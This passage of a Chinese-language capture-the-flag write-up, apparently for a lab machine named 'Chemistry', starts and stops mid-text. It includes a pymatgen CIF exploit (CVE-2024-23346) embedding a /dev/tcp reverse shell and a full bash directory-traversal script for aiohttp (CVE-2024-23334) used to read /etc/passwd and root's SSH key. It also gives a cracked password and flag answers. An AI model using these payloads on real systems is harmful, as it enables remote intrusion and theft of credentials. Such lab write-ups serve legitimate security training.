class="language-xml">SF:elcome\x20to\x20the\x20Chemistry\x20CIF\x20Analyzer\.\x20This\x20tool\x</span><br><span class="language-xml">SF:20allows\x20you\x20to\x20upload\x20a\x20CIF\x20\(Crystallographic\x20In</span><br><span class="language-xml">SF:formation\x20File\)\x20and\x20analyze\x20the\x20structural\x20data\x20c</span><br><span class="language-xml">SF:ontained\x20within\.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;div\x20class</span><br><span class="language-xml">SF:=\&quot;buttons\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span></span><br><span class="language-xml">SF:&lt;a\x20href=\&quot;/login\&quot;\x20class=\&quot;btn\&quot;&gt;Login<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>\n\x20\x20\x20\x20\x20\</span><br><span class="language-xml">SF:x20\x20\x20\x20\x20\x20\x20&lt;a\x20href=\&quot;/register\&quot;\x20class=\&quot;btn\&quot;&gt;Re</span><br><span class="language-xml">SF:gister<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span>\n\x20\x20\x20\x20\x20\x20\x20\x20<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>\n\x20\x20\x</span><br><span class="language-xml">SF:20\x20<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>\n<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>\n&lt;&quot;)%r(RTSPRequest,1F4,&quot;<span class="hljs-meta">&lt;!DOCTYPE\x20HTML\x20PUBL</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">SF</span>:IC\x20\<span class="hljs-string">&quot;-//W3C//DTD\x20HTML\x204\.01//EN\&quot;\n\x20\x20\x20\x20\x20\x20\x2</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:0\x20\&quot;http://www\.w3\.org/TR/html4/strict\.dtd\&quot;&gt;\n&lt;html&gt;\n\x20\x20\x2</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:0\x20&lt;head&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http-equiv=\&quot;Cont</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:ent-Type\&quot;\x20content=\&quot;text/html;charset=utf-8\&quot;&gt;\n\x20\x20\x20\x20\x2</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:0\x20\x20\x20&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;\</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:n\x20\x20\x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20r</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:esponse&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20v</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:ersion\x20\(&#x27;RTSP/1\.0&#x27;\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Err</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:or\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20re</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:quest\x20syntax\x20or\x20unsupported\x20method\.&lt;/p&gt;\n\x20\x20\x20\x20&lt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:/body&gt;\n&lt;/html&gt;\n&quot;</span>);</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">No</span> <span class="hljs-keyword">exact</span> <span class="hljs-keyword">OS</span> <span class="hljs-keyword">matches</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">host</span> (<span class="hljs-keyword">If</span> <span class="hljs-keyword">you</span> <span class="hljs-keyword">know</span> <span class="hljs-keyword">what</span> <span class="hljs-keyword">OS</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">running</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">it</span>, <span class="hljs-keyword">see</span> <span class="hljs-keyword">https</span>://<span class="hljs-keyword">nmap</span>.<span class="hljs-keyword">org</span>/<span class="hljs-keyword">submit</span>/ ).</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">TCP</span>/IP <span class="hljs-keyword">fingerprint</span>:</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:SCAN(V=7.94<span class="hljs-keyword">SVN</span>%E=4%D=3/22%<span class="hljs-keyword">OT</span>=22%<span class="hljs-keyword">CT</span>=1%<span class="hljs-keyword">CU</span>=37541%<span class="hljs-keyword">PV</span>=Y%<span class="hljs-keyword">DS</span>=3%<span class="hljs-keyword">DC</span>=T%G=Y%<span class="hljs-keyword">TM</span>=67<span class="hljs-keyword">DE</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:9<span class="hljs-keyword">A52</span>%P=<span class="hljs-keyword">x86_64-pc-linux-gnu</span>)SEQ(<span class="hljs-keyword">SP</span>=106%<span class="hljs-keyword">GCD</span>=1%<span class="hljs-keyword">ISR</span>=10D%<span class="hljs-keyword">TI</span>=Z%<span class="hljs-keyword">CI</span>=Z%<span class="hljs-keyword">II</span>=I%<span class="hljs-keyword">TS</span>=A)</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:OPS(<span class="hljs-keyword">O1</span>=<span class="hljs-keyword">M53AST11NW7</span>%<span class="hljs-keyword">O2</span>=<span class="hljs-keyword">M53AST11NW7</span>%<span class="hljs-keyword">O3</span>=<span class="hljs-keyword">M53ANNT11NW7</span>%<span class="hljs-keyword">O4</span>=<span class="hljs-keyword">M53AST11NW7</span>%<span class="hljs-keyword">O5</span>=<span class="hljs-keyword">M53A</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:<span class="hljs-keyword">ST11NW7</span>%<span class="hljs-keyword">O6</span>=<span class="hljs-keyword">M53AST11</span>)WIN(<span class="hljs-keyword">W1</span>=<span class="hljs-keyword">FE88</span>%<span class="hljs-keyword">W2</span>=<span class="hljs-keyword">FE88</span>%<span class="hljs-keyword">W3</span>=<span class="hljs-keyword">FE88</span>%<span class="hljs-keyword">W4</span>=<span class="hljs-keyword">FE88</span>%<span class="hljs-keyword">W5</span>=<span class="hljs-keyword">FE88</span>%<span class="hljs-keyword">W6</span>=<span class="hljs-keyword">FE88</span>)</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:ECN(R=Y%<span class="hljs-keyword">DF</span>=Y%T=40%W=<span class="hljs-keyword">FAF</span>0%O=<span class="hljs-keyword">M53ANNSNW7</span>%<span class="hljs-keyword">CC</span>=Y%Q=)T1(R=Y%<span class="hljs-keyword">DF</span>=Y%T=40%S=O%A=S+%</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:F=<span class="hljs-keyword">AS</span>%<span class="hljs-keyword">RD</span>=0%Q=)T2(R=N)T3(R=N)T4(R=Y%<span class="hljs-keyword">DF</span>=Y%T=40%W=0%S=A%A=Z%F=R%O=%<span class="hljs-keyword">RD</span>=0%Q=)T</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:5(R=Y%<span class="hljs-keyword">DF</span>=Y%T=40%W=0%S=Z%A=S+%F=<span class="hljs-keyword">AR</span>%O=%<span class="hljs-keyword">RD</span>=0%Q=)T6(R=Y%<span class="hljs-keyword">DF</span>=Y%T=40%W=0%S=A%A=</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:Z%F=R%O=%<span class="hljs-keyword">RD</span>=0%Q=)T7(R=Y%<span class="hljs-keyword">DF</span>=Y%T=40%W=0%S=Z%A=S+%F=<span class="hljs-keyword">AR</span>%O=%<span class="hljs-keyword">RD</span>=0%Q=)U1(R=Y%<span class="hljs-keyword">DF</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:=N%T=40%<span class="hljs-keyword">IPL</span>=164%<span class="hljs-keyword">UN</span>=0%<span class="hljs-keyword">RIPL</span>=G%<span class="hljs-keyword">RID</span>=G%<span class="hljs-keyword">RIPCK</span>=G%<span class="hljs-keyword">RUCK</span>=<span class="hljs-keyword">FA57</span>%<span class="hljs-keyword">RUD</span>=G)IE(R=Y%<span class="hljs-keyword">DFI</span>=N%T</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:=40%<span class="hljs-keyword">CD</span>=S)</span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">Network</span> <span class="hljs-keyword">Distance</span>: 3 <span class="hljs-keyword">hops</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">Service</span> <span class="hljs-keyword">Info</span>: <span class="hljs-keyword">OS</span>: <span class="hljs-keyword">Linux</span>; <span class="hljs-keyword">CPE</span>: <span class="hljs-keyword">cpe</span>:/o:linux:linux_kernel</span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">TRACEROUTE</span> (<span class="hljs-keyword">using</span> <span class="hljs-keyword">port</span> 993/<span class="hljs-keyword">tcp</span>)</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">HOP</span> <span class="hljs-keyword">RTT</span>       <span class="hljs-keyword">ADDRESS</span></span></span><br><span class="hljs-meta"><span class="language-xml">1   0.27 <span class="hljs-keyword">ms</span>   172.30.144.1</span></span><br><span class="hljs-meta"><span class="language-xml">2   374.51 <span class="hljs-keyword">ms</span> 10.10.16.1</span></span><br><span class="hljs-meta"><span class="language-xml">3   374.69 <span class="hljs-keyword">ms</span> 10.10.11.38</span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">Service</span> <span class="hljs-keyword">detection</span> <span class="hljs-keyword">performed</span>. <span class="hljs-keyword">Please</span> <span class="hljs-keyword">report</span> <span class="hljs-keyword">any</span> <span class="hljs-keyword">incorrect</span> <span class="hljs-keyword">results</span> <span class="hljs-keyword">at</span> <span class="hljs-keyword">https</span>://nmap.org/submit/ .</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">Nmap</span> <span class="hljs-keyword">done</span>: 1 <span class="hljs-keyword">IP</span> <span class="hljs-keyword">address</span> (1 <span class="hljs-keyword">host</span> <span class="hljs-keyword">up</span>) <span class="hljs-keyword">scanned</span> <span class="hljs-keyword">in</span> 154.02 <span class="hljs-keyword">seconds</span></span></span><br></code></pre></td></tr></table></figure><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs inform7">How many <span class="hljs-keyword">open</span> TCP ports <span class="hljs-keyword">are</span> listening on Chemistry?<br>:2<br></code></pre></td></tr></table></figure><h1 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h1><p>注册账号进去查看源码</p><p><img src="https://img.dkdun.cn/v1/2025/12/fa765fa0bed88a25.png"></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">What</span> is the path of the example <span class="hljs-title class_">CIF</span> file available <span class="hljs-keyword">in</span> the dashboard?<br><span class="hljs-symbol">:/static/example</span>.cif<br></code></pre></td></tr></table></figure><h1 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h1><p><a href="https://github.com/advisories/GHSA-vgv8-5cpj-qj2f">https://github.com/advisories/GHSA-vgv8-5cpj-qj2f</a></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> <span class="hljs-number">2024</span> CVE ID <span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span> vulnerability related <span class="hljs-built_in">to</span> parsing CIF <span class="hljs-built_in">files</span> <span class="hljs-keyword">using</span> <span class="hljs-keyword">a</span> Python library?<br>:CVE<span class="hljs-number">-2024</span><span class="hljs-number">-23346</span><br></code></pre></td></tr></table></figure><h1 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h1><p>POC 改一下，尝试反弹 shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">data_5yOhtAoR<br>_audit_creation_date            <span class="hljs-number">2018</span>-06-08<br>_audit_creation_method          <span class="hljs-string">&quot;Pymatgen CIF Parser Arbitrary Code Execution Exploit&quot;</span><br><br>loop_<br>_parent_propagation_vector.<span class="hljs-built_in">id</span><br>_parent_propagation_vector.kxkykz<br>k1 [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br><br>_space_group_magn.transform_BNS_Pp_abc  <span class="hljs-string">&#x27;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&quot;__sub&quot; + &quot;classes__&quot;]) () if d.__name__ == &quot;BuiltinImporter&quot;][0].load_module (&quot;os&quot;).system (&quot;/bin/bash -c \&#x27;sh -i &gt;&amp; /dev/tcp/10.10.16.15/1234 0&gt;&amp;1\&#x27;&quot;);0,0,0&#x27;</span><br><br><br>_space_group_magn.number_BNS  <span class="hljs-number">62.448</span><br>_space_group_magn.name_BNS  <span class="hljs-string">&quot;P  n&#x27;  m  a&#x27;  &quot;</span><br></code></pre></td></tr></table></figure><p>监听</p><p><img src="https://img.dkdun.cn/v1/2025/12/85bf413a399b1f76.png"></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What user <span class="hljs-keyword">the</span> CIF Analyzer web <span class="hljs-built_in">application</span> <span class="hljs-built_in">running</span> <span class="hljs-keyword">as</span>?<br>:app<br></code></pre></td></tr></table></figure><h1 id="Task-5"><a href="#Task-5" class="headerlink" title="Task 5"></a>Task 5</h1><p><code>instance</code> 目录下有一个 <code>database.db</code> 文件</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> name <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> sqlite database <span class="hljs-built_in">file</span> used <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> CIF analyzer web application?<br>:database.db<br></code></pre></td></tr></table></figure><h1 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h1><p><img src="https://img.dkdun.cn/v1/2025/12/08ffe3c1d94c3c58.png"></p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-attribute">63ed86ee9f624c7b14f1d4f43dc251a5</span>:unicorniosrosados<br></code></pre></td></tr></table></figure><p>拿到用户名和密码</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">rose:</span>unicorniosrosados<br></code></pre></td></tr></table></figure><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">What <span class="hljs-keyword">is</span> the rosa user<span class="hljs-symbol">&#x27;s</span> password <span class="hljs-keyword">on</span> Chemistry?<br>:unicorniosrosados<br></code></pre></td></tr></table></figure><h1 id="Submit-User-Flag"><a href="#Submit-User-Flag" class="headerlink" title="Submit User Flag"></a>Submit User Flag</h1><p>ssh 连接</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Submit the flag located in the rosa user&#x27;s home directory.<br>:<span class="hljs-number">86951223</span>f53c1ebf7cf<span class="hljs-number">0107</span>fed0df534<br></code></pre></td></tr></table></figure><h1 id="Task-8"><a href="#Task-8" class="headerlink" title="Task 8"></a>Task 8</h1><p>用 <code>netstat</code> 查看一下网络状况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -ano<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/bba66c3120044f20.png"></p><p>本地有 8080 端口</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">What TCP port that <span class="hljs-keyword">is</span> listneing only on the localhost <span class="hljs-keyword">interface</span> <span class="hljs-symbol">and</span> <span class="hljs-symbol">hosting</span> <span class="hljs-symbol">a</span> <span class="hljs-symbol">webserver</span>?<br>:<span class="hljs-symbol">8080</span><br></code></pre></td></tr></table></figure><h1 id="Task-9"><a href="#Task-9" class="headerlink" title="Task 9"></a>Task 9</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">rosa@chemiscurl -I http://127.0.0.1:8080<br>HTTP/1.1 200 OK<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 5971<br>Date: Sat, 22 Mar 2025 12:13:29 GMT<br>Server: Python/3.9 aiohttp/3.9.1<br></code></pre></td></tr></table></figure><p>从 <code>curl</code> 情况发现服务器为 <code>aiohttp</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-type">name</span> <span class="hljs-keyword">of</span> the <span class="hljs-keyword">server</span> application hosting the <span class="hljs-type">internal</span> website?<br>:aiohttp<br></code></pre></td></tr></table></figure><h1 id="Task-10"><a href="#Task-10" class="headerlink" title="Task 10"></a>Task 10</h1><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-built_in">version</span> <span class="hljs-keyword">of</span> AIOHTTP <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span> <span class="hljs-keyword">on</span> TCP port <span class="hljs-number">8080</span>?<br>:<span class="hljs-number">3.9</span><span class="hljs-number">.1</span><br></code></pre></td></tr></table></figure><h1 id="Task-11"><a href="#Task-11" class="headerlink" title="Task 11"></a>Task 11</h1><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> <span class="hljs-number">2024</span> CVE ID <span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span> <span class="hljs-built_in">directory</span> traversal vulnerability <span class="hljs-keyword">in</span> AIOHTTP?<br>:CVE<span class="hljs-number">-2024</span><span class="hljs-number">-23334</span><br></code></pre></td></tr></table></figure><h1 id="Submit-Root-Flag"><a href="#Submit-Root-Flag" class="headerlink" title="Submit Root Flag"></a>Submit Root Flag</h1><p>POC：<a href="https://github.com/s4botai/CVE-2024-23334-PoC">https://github.com/s4botai/CVE-2024-23334-PoC</a></p><p>通过 curl 能找到目录</p><p><img src="https://img.dkdun.cn/v1/2025/12/121a945627060caa.png"></p><p>Poc：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash </span><br><br><br><br><span class="hljs-comment">#Colours</span><br>greenColour=<span class="hljs-string">&quot;\e[0;32m\033[1m&quot;</span><br>endColour=<span class="hljs-string">&quot;\033[0m\e[0m&quot;</span><br>redColour=<span class="hljs-string">&quot;\e[0;31m\033[1m&quot;</span><br>blueColour=<span class="hljs-string">&quot;\e[0;34m\033[1m&quot;</span><br>yellowColour=<span class="hljs-string">&quot;\e[0;33m\033[1m&quot;</span><br>purpleColour=<span class="hljs-string">&quot;\e[0;35m\033[1m&quot;</span><br>turquoiseColour=<span class="hljs-string">&quot;\e[0;36m\033[1m&quot;</span><br>grayColour=<span class="hljs-string">&quot;\e[0;37m\033[1m&quot;</span><br><br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">helpPanel</span></span>()&#123;<br><br>  <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n<span class="hljs-variable">$&#123;redColour&#125;</span>[!] Usage: $0<span class="hljs-variable">$&#123;endColour&#125;</span>&quot;</span><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> 1 80); <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> -ne <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;redColour&#125;</span>-&quot;</span>; <span class="hljs-keyword">done</span>; <span class="hljs-built_in">echo</span> -ne <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;endColour&#125;</span>&quot;</span><br>  <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n\t<span class="hljs-variable">$&#123;grayColour&#125;</span>[-u]<span class="hljs-variable">$&#123;endColour&#125;</span> <span class="hljs-variable">$&#123;yellowColour&#125;</span>Url to attack<span class="hljs-variable">$&#123;endColour&#125;</span>&quot;</span><br>  <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\t<span class="hljs-variable">$&#123;grayColour&#125;</span>[-f]<span class="hljs-variable">$&#123;endColour&#125;</span> <span class="hljs-variable">$&#123;yellowColour&#125;</span>File to read<span class="hljs-variable">$&#123;endColour&#125;</span>\n&quot;</span><br><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">sendPayload</span></span>()&#123;<br><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> 1 15); <span class="hljs-keyword">do</span> <br>    <br>    string=<span class="hljs-string">&quot;../&quot;</span><br>    payload+=<span class="hljs-variable">$string</span><br>    <span class="hljs-built_in">command</span>=$(curl -s -o /dev/null --path-as-is -w %&#123;http_code&#125; <span class="hljs-string">&quot;$url$payload<span class="hljs-variable">$file</span>&quot;</span>)<br>  <br>    <span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$command</span> -eq 200 ]]; <span class="hljs-keyword">then</span><br>      <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n<span class="hljs-variable">$&#123;grayColour&#125;</span>[+]<span class="hljs-variable">$&#123;endColour&#125;</span> <span class="hljs-variable">$&#123;yellowColour&#125;</span>The payload<span class="hljs-variable">$&#123;endColour&#125;</span> <span class="hljs-variable">$&#123;greenColour&#125;</span>$url$payload$file<span class="hljs-variable">$&#123;endColour&#125;</span> <span class="hljs-variable">$&#123;yellowColour&#125;</span>returned the following content</span><br><span class="hljs-string">:\n<span class="hljs-variable">$&#123;endColour&#125;</span>&quot;</span><br>      curl -s --path-as-is $url$payload<span class="hljs-variable">$file</span><br>      <span class="hljs-built_in">break</span><br>    <span class="hljs-keyword">fi</span><br><br><br>  <span class="hljs-keyword">done</span><br>&#125;<br><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">getopts</span> <span class="hljs-string">&quot;u:f:h:&quot;</span> arg; <span class="hljs-keyword">do</span> <br><br>  <span class="hljs-keyword">case</span> <span class="hljs-variable">$arg</span> <span class="hljs-keyword">in</span><br>    u) url=<span class="hljs-variable">$OPTARG</span>; <span class="hljs-built_in">let</span> parameter_counter+=1;;<br>    f) file=<span class="hljs-variable">$OPTARG</span>; <span class="hljs-built_in">let</span> parameter_counter+=1;;<br>    h) helpPanel;;<br><br>  <span class="hljs-keyword">esac</span><br>  <br><span class="hljs-keyword">done</span><br><br><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$parameter_counter</span> -eq 0 ]]; <span class="hljs-keyword">then</span> <br><br>  helpPanel<br><br><span class="hljs-keyword">else</span> <br><br>  sendPayload<br><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>尝试读取  <code>/etc/passwd</code> 下的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash lfi.sh -u http://localhost:8080/assets/ -f /etc/passwd<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/6f3c3381c22a1879.png"></p><p>成功了，继续读取 <code>/root/.ssh</code> 下的 root 用户的私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash lfi.sh -u http://localhost:8080/assets/ -f /root/.ssh/id_rsa<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/06289e45d91234d1.png"></p><p>拿到私钥之后创建一个存放私钥的文件 <code>id_rsa</code>，然后给予权限，用密钥登录 ssh 服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 600 id_rsa<br>ssh root@10.10.11.38 -i id_rsa<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/1d8933ef55427379.png"></p><p>拿到 root 的 flag</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-punctuation">-</span>Submit the flag located in the root user&#x27;s home directory.<br>:<span class="hljs-number">7740</span>ea93f919b1f5c96d93df2f2a44cd<br></code></pre></td></tr></table></figure><h1 id="CVE-2024-23334"><a href="#CVE-2024-23334" class="headerlink" title="CVE-2024-23334"></a>CVE-2024-23334</h1><p>详细内容：<a href="https://github.com/aio-libs/aiohttp/security/advisories/GHSA-5h86-8mv2-jq9f">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-5h86-8mv2-jq9f</a></p><p>When using aiohttp as a web server and configuring static routes, it is necessary to specify the root path for static files. Additionally, the option ‘follow_symlinks’ can be used to determine whether to follow symbolic links outside the static root directory. When ‘follow_symlinks’ is set to True, there is no validation to check if a given file path is within the root directory.This can lead to directory traversal vulnerabilities, resulting in unauthorized access to arbitrary files on the system, even when symlinks are not present.</p><p>使用 aiohttp 作为 Web 服务器并配置静态路由时，需要指定静态文件的根路径。此外，选项  <code>&#39;follow_symlinks&#39;</code> 可用于确定是否遵循静态根目录之外的符号链接。当 <code>&#39;follow_symlinks&#39;</code>  设置为 True 时，不会进行验证来检查给定的文件路径是否在根目录中。这可能导致目录遍历漏洞，导致未经授权访问系统上的任意文件，即使符号链接不存在也是如此。</p><p>比如这个例子</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.<span class="hljs-property">router</span>.<span class="hljs-title function_">add_routes</span>([<br>    web.<span class="hljs-title function_">static</span>(<span class="hljs-string">&quot;/static&quot;</span>, <span 